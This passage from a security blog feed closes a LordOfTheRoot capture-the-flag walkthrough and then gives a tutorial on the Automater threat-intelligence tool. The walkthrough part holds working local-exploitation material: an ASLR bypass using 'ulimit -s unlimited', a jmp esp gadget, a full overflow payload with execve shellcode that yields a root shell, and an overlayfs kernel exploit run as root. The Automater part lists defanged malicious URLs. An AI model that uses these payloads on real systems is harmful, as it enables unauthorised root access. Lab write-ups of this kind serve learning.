</span><span class='line'>[------------------------------------stack-------------------------------------]
</span><span class='line'>0000| 0xbffff640 ("CCCC")
</span><span class='line'>0004| 0xbffff644 --&gt; 0xbffff600 ('A' &lt;repeats 60 times&gt;, "BBBBCCCC")
</span><span class='line'>0008| 0xbffff648 --&gt; 0xbffff6e0 --&gt; 0xbffff8c1 ("XDG_SESSION_ID=1")
</span><span class='line'>0012| 0xbffff64c --&gt; 0xb7feccea (&lt;call_init+26&gt;: add    ebx,0x12316)
</span><span class='line'>0016| 0xbffff650 --&gt; 0x2 
</span><span class='line'>0020| 0xbffff654 --&gt; 0xbffff6d4 --&gt; 0xbffff803 ("/tmp/file")
</span><span class='line'>0024| 0xbffff658 --&gt; 0xbffff674 --&gt; 0x658f7063 
</span><span class='line'>0028| 0xbffff65c --&gt; 0x804974c --&gt; 0xb7e2f990 (&lt;__libc_start_main&gt;:   push   ebp)
</span><span class='line'>[------------------------------------------------------------------------------]
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV</span></code></pre></td></tr></table></div></figure>


<p>So ESP is located at 0xbffff640. Or so I thought..when I ran my payload, I got another segfault and the address of ESP was different. I didn&rsquo;t expect something like ASLR to be enabled, but when I checked, it actually is:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /proc/sys/kernel/randomize_va_space
</span><span class='line'>2</span></code></pre></td></tr></table></div></figure>


<p>I checked with <em>ldd</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:/tmp$ ldd file 
</span><span class='line'>  linux-gate.so.1 =&gt;  (0xb773d000)
</span><span class='line'>  libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7576000)
</span><span class='line'>  /lib/ld-linux.so.2 (0xb773f000)
</span><span class='line'>smeagol@LordOfTheRoot:/tmp$ ldd file 
</span><span class='line'>  linux-gate.so.1 =&gt;  (0xb770c000)
</span><span class='line'>  libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7545000)
</span><span class='line'>  /lib/ld-linux.so.2 (0xb770e000)</span></code></pre></td></tr></table></div></figure>


<p>After some googling, I found a <a href="https://www.exploit-db.com/exploits/39669/">trick to disable ASLR</a>. On a vulnerable 32 bit system, ASLR doesn&rsquo;t always randomize the mmap base address when the stack size is set to unlimited. I verified that it works:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:/tmp$ ulimit -s unlimited
</span><span class='line'>smeagol@LordOfTheRoot:/tmp$ ldd file 
</span><span class='line'>  linux-gate.so.1 =&gt;  (0x40024000)
</span><span class='line'>  libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x4003d000)
</span><span class='line'>  /lib/ld-linux.so.2 (0x40000000)
</span><span class='line'>smeagol@LordOfTheRoot:/tmp$ ldd file 
</span><span class='line'>  linux-gate.so.1 =&gt;  (0x40024000)
</span><span class='line'>  libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x4003d000)
</span><span class='line'>  /lib/ld-linux.so.2 (0x40000000)</span></code></pre></td></tr></table></div></figure>


<p>I tweaked the exploit again, but I still couldn&rsquo;t hit on a valid ESP address. In the end, I used Peda to help me locate a <em>jmp esp</em> address:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ jmpcall esp
</span><span class='line'>Not found
</span><span class='line'>gdb-peda$ jmpcall esp libc
</span><span class='line'>0x4003ea85 : jmp esp</span></code></pre></td></tr></table></div></figure>


<p>Adjusted the exploit again, and it worked:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ r $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
</span><span class='line'>Starting program: /tmp/file $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
</span><span class='line'>process 5184 is executing new program: /bin/dash
</span><span class='line'>$ whoami
</span><span class='line'>[New process 5187]
</span><span class='line'>process 5187 is executing new program: /usr/bin/whoami
</span><span class='line'>smeagol
</span><span class='line'>$ [Inferior 2 (process 5187) exited normally]
</span><span class='line'>Warning: not running or target is remote</span></code></pre></td></tr></table></div></figure>


<p>To gain root, we need to exploit the real suid binary:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:/SECRET/door2$ ./file $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
</span><span class='line'># whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<h2>Privilege escalation method #3 &ndash; kernel exploit</h2>

<p>Lastly, we&rsquo;re back to the <a href="https://www.exploit-db.com/exploits/39166">overlayfs exploit</a>. It&rsquo;s just a matter of download, compile, run:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:/tmp$ ./overlay 
</span><span class='line'>root@LordOfTheRoot:/tmp# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>We owned Mordor! This was such an interesting challenge, learned many new things! Thanks to KookSec for this!</p>

<h4>Learn more</h4>

<ul>
<li><p><a href="https://www.exploit-db.com/papers/13030/">ASLR bypassing</a></p></li>
<li><p><a href="http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf">Linux Interactive Exploit Development with GDB and PEDA</a></p></li>
<li><p><a href="https://www.exploit-db.com/exploits/39669/">disable ASLR trick</a></p></li>
</ul>


<p>Will leave you with this:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/lordoftheroot/legolas.jpg" title="legolas" alt="legolas"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Automater - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/11/automater-kali-linux-tools/"/>
    <updated>2017-06-11T03:57:26-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/11/automater-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you want to check suspicious IPs, domains and hashes for maliciousness. Maybe you&rsquo;ve heard that your favorite news site has been hacked and is serving malware to its users. You&rsquo;d like to confirm if something is dangerous or not, without navigating to it and risking to get compromised in the process. There is a Python tool on Kali that can help you with just that! Enter Automater!</p>

<!-- more -->


<p>Homepage: <a href="http://www.tekdefense.com/automater/">http://www.tekdefense.com/automater/</a></p>

<p>If you want to get it on your distro, you can grab it from its <a href="https://github.com/1aN0rmus/TekDefense-Automater">Github repository</a></p>

<h1>Automater description</h1>

<blockquote><p>Automater is a URL/Domain, IP Address, and Md5 Hash OSINT tool aimed at making the analysis process easier for
intrusion Analysts. Given a target (URL, IP, or HASH) or a file full of targets Automater will return relevant
results from sources like the following: IPvoid.com, Robtex.com, Fortiguard.com, unshorten.me, Urlvoid.com,
Labs.alienvault.com, ThreatExpert, VxVault, and VirusTotal.</p></blockquote>

<h1>Automater options</h1>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>automater -h
</span><span class='line'>usage: Automater.py [-h] [-o OUTPUT] [-b] [-f CEF] [-w WEB] [-c CSV]
</span><span class='line'>                    [-d DELAY] [-s SOURCE] [--proxy PROXY] [-a USERAGENT] [-V]
</span><span class='line'>                    [-r] [-v]
</span><span class='line'>                    target
</span><span class='line'>
</span><span class='line'>IP, URL, and Hash Passive Analysis tool
</span><span class='line'>
</span><span class='line'>positional arguments:
</span><span class='line'>  target                List one IP Address (CIDR or dash notation accepted),
</span><span class='line'>                        URL or Hash to query or pass the filename of a file
</span><span class='line'>                        containing IP Address info, URL or Hash to query each
</span><span class='line'>                        separated by a newline.
</span><span class='line'>
</span><span class='line'>optional arguments:
</span><span class='line'>  -h, --help            show this help message and exit
</span><span class='line'>  -o OUTPUT, --output OUTPUT
</span><span class='line'>                        This option will output the results to a file.
</span><span class='line'>  -b, --bot             This option will output minimized results for a bot.
</span><span class='line'>  -f CEF, --cef CEF     This option will output the results to a CEF formatted
</span><span class='line'>                        file.
</span><span class='line'>  -w WEB, --web WEB     This option will output the results to an HTML file.
</span><span class='line'>  -c CSV, --csv CSV     This option will output the results to a CSV file.
</span><span class='line'>  -d DELAY, --delay DELAY
</span><span class='line'>                        This will change the delay to the inputted seconds.
</span><span class='line'>                        Default is 2.
</span><span class='line'>  -s SOURCE, --source SOURCE
</span><span class='line'>                        This option will only run the target against a
</span><span class='line'>                        specific source engine to pull associated domains.
</span><span class='line'>                        Options are defined in the name attribute of the site
</span><span class='line'>                        element in the XML configuration file. This can be a
</span><span class='line'>                        list of names separated by a semicolon.
</span><span class='line'>  --proxy PROXY         This option will set a proxy to use (eg.
</span><span class='line'>                        proxy.example.com:8080)
</span><span class='line'>  -a USERAGENT, --useragent USERAGENT
</span><span class='line'>                        This option allows the user to set the user-agent seen
</span><span class='line'>                        by web servers being utilized. By default, the user-
</span><span class='line'>                        agent is set to Automater/version
</span><span class='line'>  -V, --vercheck        This option checks and reports versioning for
</span><span class='line'>                        Automater. Checks each python module in the Automater
</span><span class='line'>                        scope. Default, (no -V) is False
</span><span class='line'>  -r, --refreshxml      This option refreshes the tekdefense.xml file from the
</span><span class='line'>                        remote GitHub site. Default (no -r) is False.
</span><span class='line'>  -v, --verbose         This option prints messages to the screen. Default (no
</span><span class='line'>                        -v) is False.</span></code></pre></td></tr></table></div></figure>


<p>You can see there are multiple output options for further processing, like CEF formatted file, CSV and HTML. Also, it&rsquo;s important to remember that tools usually come with their default user agents, and it might be beneficial to change this when you run it, and make it look like a real browser.</p>

<h1>Automater usage</h1>

<ul>
<li>check IP for malware</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>automater 185.62.190.110
</span><span class='line'>/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:845: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
</span><span class='line'>  InsecureRequestWarning)
</span><span class='line'>
</span><span class='line'>____________________     Results found for: 185.62.190.110     ____________________
</span><span class='line'>No results found in the RTex DNS
</span><span class='line'>No results found in the FNet URL
</span><span class='line'>[+] VT ASN: No results found
</span><span class='line'>[+] VT Country: ZZ
</span><span class='line'>[+] VT AS Owner: No results found
</span><span class='line'>[+] VT pDNS: ('2016-08-24 00:00:00', 'cl0.f-aws.com')
</span><span class='line'>[+] VT pDNS: ('2017-05-19 00:00:00', 'mail.attw.io')
</span><span class='line'>[+] VT pDNS: ('2016-06-05 00:00:00', 'weinne.net')
</span><span class='line'>[+] VT pDNS: ('2017-02-08 00:00:00', 'www[.]woodmann.com')
</span><span class='line'>[+] VT Malware: ('2017-06-02 10:46:35', 'ceeca0c7dc341fa57532470f2d7caaa427bf77e1e533b7ff3d9d8e245d6ea5fd')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_Corso_2009-2-4_20.20_Corso_7.02.34.rar', '2017-06-07 17:23:57')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Tools/Vbdec34.zip', '2017-06-04 23:44:26')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/tools/', '2017-06-02 11:41:58')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/tools/dongles/vdog104.zip', '2017-06-02 10:46:33')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/archives/bartpak7.rar', '2017-06-01 19:35:43')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/bin_de_decompiler_2009-7-18_22.55_de_decompiler_lite.zip|&gt;de_decompiler_lite.exe', '2017-06-01 14:57:19')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/index.php/Category:RCE_Tools', '2017-05-31 09:16:42')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/index.php/Category:SoftICE_Extensions', '2017-05-27 18:28:27')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/forum/attachment.php?s=d1dedc683453c119989330b5967a2dea&attachmentid=2311&d=1278836882', '2017-05-26 20:45:35')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/fravia/exe/cryptpad.exe', '2017-05-26 18:00:12')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_LordPE_2010-6-29_3.9_LordPE_1.41_Deluxe_b.zip', '2017-05-26 13:50:29')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/index.php/LordPE', '2017-05-26 13:42:00')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/tools/dongles/admon25.rar', '2017-05-25 05:51:39')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/bin_wintruder_2008-10-24_22.21_wintruder.zip', '2017-05-24 12:33:31')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_Echo_Mirage_2014-1-11_17.28_EchoMirage-3.1.rar', '2017-05-24 10:42:52')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Archives/Kgensrcs.zip', '2017-05-19 18:39:05')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/bin_zeroadd_2014-5-9_1.29_zeroadd.zip', '2017-05-16 08:33:15')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Unpackers/Arm201b1.zip', '2017-05-11 22:16:38')
</span><span class='line'>[+] VT Mal URLs: ("hxxp://www[.]woodmann.com/collaborative/knowledge/images/bin_stuxnet's_rootkit_(mrxnet)_into_c++_2011-2-6_13.54_mrxnet.rar", '2017-05-11 06:28:02')
</span><span class='line'>[+] VT Mal URLs: ("hxxp://www[.]woodmann.com/collaborative/knowledge/images/Bin_Stuxnet's_Rootkit_(MRxNet)_into_C++_2011-2-6_13.54_MRxNet.rar", '2017-05-10 11:56:48')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/', '2017-05-09 13:25:03')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Tools/Dongles/Edgehasp.zip', '2017-05-09 06:50:13')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/index.php/Kernel_Detective', '2017-05-07 23:49:45')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/BobSoft/Pages/Plugins/ImmDbg', '2017-05-02 19:47:49')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/index.php/AdmiralDebilitate', '2017-04-29 23:08:33')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Tutorials/Nolflex3.htm', '2017-04-21 23:28:28')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_ImpREC_2011-7-16_8.11_ImpREC_1.7e.rar', '2017-04-20 17:33:51')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/index.php/Detect_It_Easy', '2017-04-19 22:55:52')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/forum/attachment.php', '2017-04-19 21:13:35')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_IIDKing_2007-10-19_23.37_tf23.zip', '2017-04-18 10:44:44')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_RTA_2011-9-6_20.52_rta2b2.zip', '2017-04-13 08:16:56')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Tools/Dongles/Haspdll.zip', '2017-04-11 17:42:56')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools', '2017-04-10 16:46:49')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Unpackers/ArmStripper01b6.rar', '2017-04-10 04:09:19')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/index.php/Echo_Mirage', '2017-04-08 16:34:47')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://185.62.190.110/accessroot/arteam/site/download.php?view.331', '2017-04-05 05:34:20')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_Unpacker_PECompact_2014-1-15_15.34_Unpacker_PECompact.rar', '2017-04-02 21:39:34')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/forum/forum.php', '2017-03-24 13:36:54')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_Superkill_2009-6-4_22.16_Superkill-V1.0.zip', '2017-03-16 01:02:57')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Tools/Wm.zip', '2017-03-16 01:02:57')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Tools/Cdtools.zip', '2017-03-16 01:02:57')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/FLEXlm/Lmv8gen.zip', '2017-03-15 18:06:40')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/krobar/collections/tkc/06.zip', '2017-03-14 19:32:26')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Archives/Crackmes.zip', '2017-03-14 19:32:26')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/knowledge/images/bin_virut.a_malware_analysis_paper_2010-9-3_15.53_virut.a.rar', '2017-03-14 14:34:44')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/index.php', '2017-03-14 09:22:56')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/krobar/collections/stones.zip', '2017-03-11 00:34:59')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/fravia/sources/WINUSER.H', '2017-03-08 11:57:20')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/bin_chimprec_2008-6-24_13.59_chimprec.zip|&gt;chimprec.exe', '2017-03-08 11:15:11')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/tools/images/', '2017-03-03 07:12:55')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/krobar/collections/id-site.zip', '2017-02-24 01:16:48')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/collaborative/knowledge/images/Bin_Stuxnet&', '2017-02-15 15:19:26')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/BobSoft/Files/Other/PEiD-0.95-20081103.zip', '2017-02-15 00:46:58')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://www[.]woodmann.com/crackz/Tools/Miscarc.zip', '2017-02-09 14:37:08')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://cl0.f-aws.com/metin2sometimes/client/pack/icepack.mp3.lz', '2016-10-09 15:24:40')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://cl0.f-aws.com/metin2sometimes/client/pack/efect.txt.lz', '2016-10-09 15:24:40')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://cl0.f-aws.com/metin2sometimes/client/lib/__future__.pyc.lz', '2016-10-09 15:24:39')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://cl0.f-aws.com/metin2sometimes/client/miles/mssa3d.m3d.lz', '2016-10-09 15:24:39')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://cl0.f-aws.com/metin2sometimes/app/normalize.css', '2016-10-09 15:24:37')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://cl0.f-aws.com/metin2sometimes/client/bgm/xmas.mp3.lz', '2016-10-09 15:24:38')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://cl0.f-aws.com/metin2sometimes/client/devil.dll.lz', '2016-10-09 15:24:37')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://cl0.f-aws.com/metin2asgard/client/mark/10.tga.lz', '2016-09-27 17:36:49')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://cl0.f-aws.com/metin2asgard/client/mark/10_1.tga.lz', '2016-09-27 17:34:08')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://185.62.190.110/Deutsche-Bank/db/erfolg.html', '2016-03-07 08:56:47')
</span><span class='line'>[+] VT Mal URLs: ('hxxp://185.62.190.110/Deutsche-Bank/db/db.php', '2016-02-29 13:36:45')
</span><span class='line'>[+] Blacklist from IPVoid: No results found
</span><span class='line'>[+] ISP from IPvoid: No results found
</span><span class='line'>[+] Country from IPVoid: No results found
</span><span class='line'>[+] Malc0de Date: No results found
</span><span class='line'>[+] Malc0de IP: No results found
</span><span class='line'>[+] Malc0de Country: No results found
</span><span class='line'>[+] Malc0de ASN: No results found
</span><span class='line'>[+] Malc0de ASN Name: No results found
</span><span class='line'>[+] Malc0de MD5: No results found
</span><span class='line'>[+] Reputation Authority Score: 50/100
</span><span class='line'>[+] FreeGeoIP Country Name: Netherlands
</span><span class='line'>[+] FreeGeoIP Region Name: No results found
</span><span class='line'>[+] FreeGeoIP City: No results found
</span><span class='line'>[+] FreeGeoIP Zipcode: No results found
</span><span class='line'>[+] FreeGeoIP Latitude: 52.3824
</span><span class='line'>[+] FreeGeoIP Longitude: 4.8995
</span><span class='line'>[+] SANS total target IPs seen: No results found
</span><span class='line'>[+] SANS total packets blocked: No results found
</span><span class='line'>[+] SANS last seen on: No results found
</span><span class='line'>[+] SANS first seen on: No results found
</span><span class='line'>No results found in the THIP
</span><span class='line'>No results found in the TekHP
</span><span class='line'>[+] ProjectHoneypot activity type: No results found
</span><span class='line'>[+] ProjectHoneypot first mail received: No results found
</span><span class='line'>[+] ProjectHoneypot last mail received: No results found
</span><span class='line'>[+] ProjectHoneypot total mails received: No results found
</span><span class='line'>[+] ProjectHoneypot spider first seen: No results found
</span><span class='line'>[+] ProjectHoneypot spider last seen: No results found
</span><span class='line'>[+] ProjectHoneypot spider sightings: No results found
</span><span class='line'>[+] ProjectHoneypot user-agent sightings: No results found
</span><span class='line'>[+] ProjectHoneypot first post on: No results found
</span><span class='line'>[+] ProjectHoneypot last post on: No results found
</span><span class='line'>[+] ProjectHoneypot form posts: No results found
</span><span class='line'>[+] ProjectHoneypot first rule break on: No results found
</span><span class='line'>[+] ProjectHoneypot last rule break on: No results found
